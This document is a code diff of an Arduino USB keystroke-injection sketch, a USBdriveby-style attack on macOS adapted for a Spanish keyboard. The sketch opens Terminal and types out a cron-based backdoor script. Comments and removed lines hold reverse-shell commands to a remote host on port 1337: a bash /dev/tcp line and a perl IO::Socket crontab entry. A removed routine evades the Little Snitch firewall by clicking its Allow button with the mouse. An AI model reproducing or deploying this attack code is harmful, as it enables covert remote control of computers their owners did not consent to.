@@ -2,66 +2,95 @@
 // By Angel Diaz (https://twitter.com/angeldiazibarra)
 // Inspired by Samy Kamkar's USBdriveby (https://samy.pl/usbdriveby)
 
-#define EVIL_SERVER "xxx.com"
-#define EVIL_USER "yyy"
-#define EVIL_PASS "zzz"
-#define LED_PIN 13
+// Adapted for Spanish keyboard layout
 
-// delay ms
-int ds = 500;
+#define LED_PIN 13
+#define KEY_LEFT_CTRL   0x80
+#define KEY_LEFT_SHIFT    0x81
+#define KEY_LEFT_ALT    0x82
+#define KEY_LEFT_GUI    0x83
+#define KEY_RIGHT_CTRL    0x84
+#define KEY_RIGHT_SHIFT   0x85
+#define KEY_RIGHT_ALT   0x86
+#define KEY_RIGHT_GUI   0x87
 
 void setup()
 {
-  // give us a little time to connect up
-  delay(1000);
+  // wait a little to connect up
+  delay(500);
 
+  Keyboard.begin();
+ 
   // allow controlling LED
   pinMode(LED_PIN, OUTPUT);
 
   // turn the LED on while we're pwning
   digitalWrite(LED_PIN, HIGH);
 
-  // open spotlight, then System Preferences<return>
-  // MOD ADI: changed "System Preferences" to "pref" for international users
-  openapp("pref");
-
   // now open Terminal and open new Terminal tab
   openapp("termi");
-  cmd(KEY_T);
-
-  // if the little snitch firewall is
-  // installed, let's permanently add our
-  // remote host so they never get asked to
-  // allow the connection since little
-  // snitch allows the keyboard to control it
-  //
-  // if there is no little snitch, we perform
-  // keystrokes that, in Terminal, will
-  // cause no issues.
   
-  // TO DO
-  // pwnLittleSnitch();
+  // Create a cron which opens a backdoor
 
-  // add our reverse tunneling backdoor to
-  // cron to run every 5 minutes
+  // typeln("rm /Library/Caches/cron.sh");
+  Keyboard.print("rm "); shift(55);
+  Keyboard.print("Library"); shift(55);
+  Keyboard.print("Caches"); shift(55);
+  typeln("cron.sh");
 
-  // TO DO
-  // typeln("(crontab -l ; echo \"*/5 * * * * perl -MIO::Socket -e'\\$c=new IO::Socket::INET(\\\"72.14.179.47:1337\\\");print\\$c \\`\\$_\\`while<\\$c>'\")  | crontab -");
+  // typeln("vi /Library/Caches/cron.sh");
+  Keyboard.print("vi "); shift(55);
+  Keyboard.print("Library"); shift(55);
+  Keyboard.print("Caches"); shift(55);
+  typeln("cron.sh");
+  
+  Keyboard.print("i");
+  
+  // typeln("#!/bin/bash");
+  alt(51); shift(49); shift(55);
+  Keyboard.print("bin"); shift(55);
+  typeln("bash");
+  
+  // typeln("bash -i >& /dev/tcp/XXX.XX.XX.XX/1337 0>&1");
+  
+  // Write and save
+  Keyboard.press(KEY_ESC);
+  Keyboard.press(KEY_ESC);
+  shift(46); typeln("w"); // typeln(":w");
+  shift(46); typeln("q"); // typeln(":q");
 
-  delay(1000);
+  // Close terminal window
+  cmd(113); // cmd + q
+}
 
-  // then close the terminal window
-  typeln("");
-  typeln("exit");
+void shift(int key){
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(key);
+  Keyboard.releaseAll();
+}
 
-  // exit terminal (if nothing is running)
-  cmd(KEY_Q);
+void alt(int key){
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(key);
+  Keyboard.releaseAll();
+}
 
-  // in case another window is running in terminal,
-  // don't quit terminal in popup window by hitting ESC
-  k(KEY_ESC);
+void cmd(int key){
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(key);
+  Keyboard.releaseAll();
+}
 
-  // we're done!
+void openapp(String app){
+  // CMD + Space to open Spotlight
+  cmd(32);
+  
+  // wait for new window to open:
+  delay(50);
+    
+  typeln(app);
+  
+  delay(250);
 }
 
 
@@ -71,111 +100,16 @@ void setup()
 void typeln(String chars)
 {
   Keyboard.print(chars);
-  // delay(ds);
-  Keyboard.println("");
-  // delay(ds * 4);
-}
-
-
-// open an application on OS X via spotlight/alfred
-void openapp(String app)
-{
-  // open spotlight (or alfred/qs), then the app
-  cmd(KEY_SPACE);
-  typeln(app);
-}
-
-
-void k(int key)
-{
-  Keyboard.set_key1(key);
-  Keyboard.send_now();
-  delay(ds / 2);
-
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(ds / 2);
-}
-
-void mod(int mod, int key)
-{
-  Keyboard.set_modifier(mod);
-  Keyboard.send_now();
-  Keyboard.set_key1(key);
-  Keyboard.send_now();
-  delay(ds);
-
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(ds);
-}
-
-void ctrl(int key)
-{
-  mod(MODIFIERKEY_CTRL, key);
-}
-
-void cmd(int key)
-{
-  mod(MODIFIERKEY_GUI, key);
-}
-
-void shift(int key)
-{
-  mod(MODIFIERKEY_SHIFT, key);
+  delay(100);
+  Keyboard.write(176);
+  delay(200);
 }
 
 void loop()
 {
   // blink quickly so we know we're done
   digitalWrite(LED_PIN, HIGH);
-  delay(ds / 2);
+  delay(250);
   digitalWrite(LED_PIN, LOW);
-  delay(ds / 2);
-}
-
-// evade little snitch if it's installed, but don't fumble if not installed
-void pwnLittleSnitch()
-{
-  // connect to our reverse tunneled backdoor to
-  // get little snitch to open if it's installed
-  typeln("perl -MIO::Socket -e'$c=new IO::Socket::INET(\"72.14.179.47:1337\")'");
-
-  // move our keyboard using the arrow keys to allow this host permanently ;)
-  k(KEY_UP);
-  k(KEY_LEFT);
-
-  // go to beginning of line if there's no little snitch (Ctrl+A)
-  // since we would still be in terminal
-  ctrl(KEY_A);  // go to beginning of line (Ctrl+a)
-  shift(KEY_3); // add a # (shift+3)
-  ctrl(KEY_C);  // ^C to exit line (Ctrl+c)
-
-  // Here is where we submit Little Snitch with the mouse, based on what you selected above.
-  // Move to top left of screen
-  for (int i = 0; i < 1000; i++)
-  {
-    Mouse.move(-10, -10);
-    delay(1);
-  }
-
-  // If we have hot corners enabled, move out and move back in
-  for (int i = 0; i < 100; i++)
-  {
-    Mouse.move(1, 1);
-    delay(5);
-  }
-  delay(500);
-
-  // move to Little Snitch Allow button
-  Mouse.move(100, 100);
-  delay(20);
-  Mouse.move(100, 100);
-  delay(20);
-  Mouse.move(120, -70);
-
-  delay(1000);
-  Mouse.click(); // Click click!
-  delay(ds);
+  delay(250);
 }
